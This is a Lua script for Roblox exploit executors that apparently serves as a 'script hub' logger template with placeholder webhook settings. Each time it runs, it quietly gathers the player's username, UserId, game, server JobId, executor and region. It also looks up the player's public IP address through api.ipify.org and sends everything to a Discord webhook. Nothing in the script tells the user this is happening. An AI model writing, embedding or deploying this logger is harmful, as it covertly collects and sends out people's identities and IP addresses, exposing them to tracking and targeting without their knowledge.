-- OWNED BY XEN-X 
local WEBHOOK_URL = "Discord Webhook Here"
local HUB_NAME = "Name Here"
local EMBED_COLOR = 16777215

--==================================================
-- SERVICES
--==================================================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer

--==================================================
-- SAFE REQUEST
--==================================================
local http_request =
    request or
    http_request or
    syn and syn.request or
    fluxus and fluxus.request

if not http_request then
    warn("YOUR EXECUTOR ISNT SUPPORTED")
    return
end

--==================================================
-- GAME INFO
--==================================================
local GAME_ID = game.PlaceId
local JOB_ID = game.JobId
local GAME_NAME = "Unknown"

pcall(function()
    GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
end)

--==================================================
-- EXECUTOR DETECTION
--==================================================
local EXECUTOR = "Unknown"

pcall(function()
    if identifyexecutor then
        EXECUTOR = identifyexecutor()
    elseif getexecutorname then
        EXECUTOR = getexecutorname()
    end
end)

--==================================================
-- REGION
--==================================================
local REGION = "Unknown"

pcall(function()
    REGION = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
end)

--==================================================
-- IP (BEST EFFORT - OPTIONAL)
--==================================================
local IP_ADDRESS = "Hidden"

pcall(function()
    local res = http_request({
        Url = "https://api.ipify.org",
        Method = "GET"
    })
    if res and res.Body then
        IP_ADDRESS = res.Body
    end
end)

--==================================================
-- ANTI DUPLICATE (SESSION)
--==================================================
if _G.__KUNI_LOGGED then
    return
end
_G.__KUNI_LOGGED = true

--==================================================
-- WEBHOOK SEND
--==================================================
local function sendWebhook()
    local data = {
        username = HUB_NAME .. " Logger",
        avatar_url = "Profile URL Here",
        embeds = {{
            title = "🚀 Script Executed",
            color = EMBED_COLOR,

            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                    .. LocalPlayer.UserId
                    .. "&width=420&height=420&format=png"
            },

            fields = {
                {
                    name = "👤 Player",
                    value =
                        "**Username:** " .. LocalPlayer.Name ..
                        "\n**UserId:** " .. LocalPlayer.UserId,
                    inline = false
                },
                {
                    name = "🎮 Game",
                    value =
                        "**Name:** " .. GAME_NAME ..
                        "\n**GameId:** " .. GAME_ID,
                    inline = false
                },
                {
                    name = "🖥️ Session",
                    value =
                        "**Executor:** " .. EXECUTOR ..
                        "\n**JobId:** `" .. JOB_ID .. "`",
                    inline = false
                },
                {
                    name = "🌍 Network",
                    value =
                        "**Region:** " .. REGION ..
                        "\n**IP:** " .. IP_ADDRESS,
                    inline = false
                }
            },

            footer = {
                text = HUB_NAME .. " • Secure Logger"
            },

            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        http_request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

--==================================================
-- FIRE
--==================================================
sendWebhook()
